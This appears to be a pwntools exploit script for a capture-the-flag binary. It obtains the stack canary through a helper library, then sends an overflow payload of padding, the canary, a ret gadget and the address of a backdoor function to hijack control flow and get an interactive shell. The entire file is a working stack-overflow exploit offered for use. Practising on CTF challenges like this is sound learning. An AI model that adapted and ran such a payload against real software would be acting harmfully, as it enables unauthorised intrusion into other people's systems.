from pwn import *
import sys
context(arch='amd64', os='linux')

file_name = './pwn'
#libc_name = './libc.so.6'

elf = ELF(file_name)
#libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1

if switch:
    target = '127.0.0.1'
    port   = 37651
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

s    = lambda data                : p.send(data)
sa   = lambda delim, data         : p.sendafter(delim, data)
sl   = lambda data                : p.sendline(data)
sla  = lambda delim, data         : p.sendlineafter(delim, data)
r    = lambda numb=4096          : p.recv(numb)
ru   = lambda delim, drop=True   : p.recvuntil(delim, drop)
rl   = lambda                    : p.recvline()
lg   = lambda name, data         : log.success(name + ': ' + hex(data))
uu64 = lambda data                : u64(data.ljust(8, b'\x00'))
# search = lambda s : next(libc.search(s if isinstance(s, bytes) else s.encode()))

# def init_libc(leak, offset, name='Libc'):
#     if isinstance(offset, str):
#         offset = libc.sym[offset]
#     libc.address = leak - offset
#     log.success(f"{name} Base: {hex(libc.address)}")

#################################################################################
import ctypes
lib = ctypes.CDLL('./getcanary.so')
canary = lib.get_canary()
lg('canary',canary)
ret = 0x40101a
backdoor = 0x401276
sla(b"Do you want to brute-force this system? (y/n)",b'y')
payload = flat([
   b'A'*(0x90-0x14),
   p32(canary),
   b'A'*0x18,
   ret,
   backdoor
])
sla(b'Enter your message: ',payload)
p.interactive()